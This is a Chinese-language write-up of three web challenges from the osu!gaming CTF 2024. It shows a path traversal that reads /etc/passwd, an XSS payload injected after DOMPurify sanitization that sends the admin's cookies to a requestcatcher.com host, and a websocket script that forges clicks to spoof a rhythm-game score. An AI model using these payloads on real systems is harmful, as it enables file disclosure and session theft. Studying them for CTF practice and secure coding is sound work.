---
title: osu!gaming CTF 2024 writeup
contest: osu!gaming
year: 2024
difficulty: hard
vuln_type: web_unknown
tags: [express, purify, xss-bypass, youtube-bbcode, image-lfi, websocket, rhythm-game, bpmspoof]
attack_chain:
  - '/image?path=file.png' LFI 限制 png/jpg
  - '?path=foo.png/../../../etc/passwd' 绕
  - renderBio purify.sanitize 后 replaceAll [youtube]...[/youtube]
  - 净化后再注入 → XSS
  - 'dummy=" onload="fetch(...document.cookie)'
  - 管理员 admin cookie 截取
  - /api/update POST csrf + bio
  - websocket 模拟点击伪造 BPM
  - /score 高分
key_payload: purify 后处理 + youtube BBCode XSS + BPM 伪造
one_liner: osu!gaming CTF 2024 writeup：Express 路径遍历 + purify 后 XSS + WebSocket BPM 伪造。
lesson: 'purify.sanitize 后再做字符串处理是经典 XSS 绕过模式。'
quality: high
---

osu!gaming CTF 2024 writeup（来源 ctfiot）。

**Web 1: image LFI**
```javascript
app.get("/image", (req, res) => {
    if (req.query.path.split(".")[1] === "png" || req.query.path.split(".")[1] === "jpg") {
        res.sendFile(path.resolve('./img/' + req.query.path));
    } else {
        res.status(403).send('Access Denied');
    }
});
```

**绕过**：
- `?path=foo.png/../../../etc/passwd` - 路径包含 `.png` 但 `path.resolve` 解析后到 `/etc/passwd`
- 校验后 `path.resolve` 不检查根目录

**Web 2: renderBio XSS**
```javascript
const renderBio = (data) => {
    const html = renderBBCode(data);
    const sanitized = purify.sanitize(html);
    // do this after sanitization because otherwise iframe will be removed
    return sanitized.replaceAll(/\[youtube\](.+?)\[\/youtube\]/g, '');
};
```

**关键洞**：
1. `purify.sanitize` 先净化
2. 然后 `replaceAll` 删除 `[youtube]...[/youtube]` 块
3. 注入内容放在 `[/youtube]` 之前，replaceAll 删除后留下"残余 XSS"

**Payload**：
```
[youtube]" onload="fetch(`https://[yours].requestcatcher.com/get?${document.cookie}`)" dummy="[/youtube]
```

replaceAll 替换后：`<empty string>` 加上 `" onload="..."` 残余 → XSS 触发。

**Web 3: WebSocket BPM 伪造**
```javascript
// scoring algorithm
session.results[session.round] = session.results[session.round].sort((a, b) => {
    const bpmDeltaA = Math.abs(Math.round(a.bpm) - session.songs[session.round].bpm);
    const bpmDeltaB = Math.abs(Math.round(b.bpm) - session.songs[session.round].bpm);
    if (bpmDeltaA !== bpmDeltaB) return bpmDeltaA - bpmDeltaB;
    return a.ur - b.ur
});
```

**伪造脚本**：
```python
from websocket import create_connection
import json, time
ws = create_connection("wss://stream-vs.web.osugaming.lol/")

def send_and_recv(payload):
    ws.send(json.dumps(payload))
    return json.loads(ws.recv())

send_and_recv({"type":"login","data":"evilman"})
send_and_recv({"type":"challenge"})
songs = send_and_recv({"type":"start"})['data']['songs']
for song in songs:
    start = int(time.time())
    end = start + song['duration'] * 1000
    interval = 60000 / song['bpm'] / 4
    clicks = [start]
    while clicks[-1] + interval <= end:
        clicks.append(clicks[-1] + interval)
    
    p = {"type":"results","data":{"clicks":clicks,"start":start, "end":end}}
    send_and_recv(p)
```

**bpm 计算公式**：
```javascript
const bpm = Math.round(((clickArr.length / (end - start) * 60000)/4) * 100) / 100;
```

按目标 BPM 精确生成 clicks 时间戳，UR（标准差）小 → 高分。

整题是"Web 套娃 + WebSocket 游戏"典型代表。
